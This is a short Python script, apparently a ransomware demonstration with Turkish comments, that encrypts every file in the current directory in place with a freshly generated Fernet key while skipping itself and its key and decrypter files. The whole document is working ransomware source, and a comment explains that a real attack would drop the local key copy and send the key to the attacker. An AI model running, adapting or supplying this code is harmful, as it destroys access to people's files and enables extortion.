import os
from cryptography.fernet import Fernet  # symmetric encryption

file_list = []
for file in os.listdir():
    if file == "ransom.py" or \
            file == "generatedkey.key" or \
            file == "ransomdecrypter.py":
        continue
    if os.path.isfile(file):    # dosya kontrolü
        file_list.append(file)

key = Fernet.generate_key()

# Gerçek saldırıda alttaki 3 satır olmaz. key bilgisi başka şekilde
# hackera yönlendirilir.

print(key)
with open("generatedkey.key", "wb") as generatedkey:   # wb: Write binary
    generatedkey.write(key)

for file in file_list:
    with open(file, "rb") as the_file:  # rb: read binary
        contents = the_file.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as the_file:
        the_file.write(contents_encrypted)
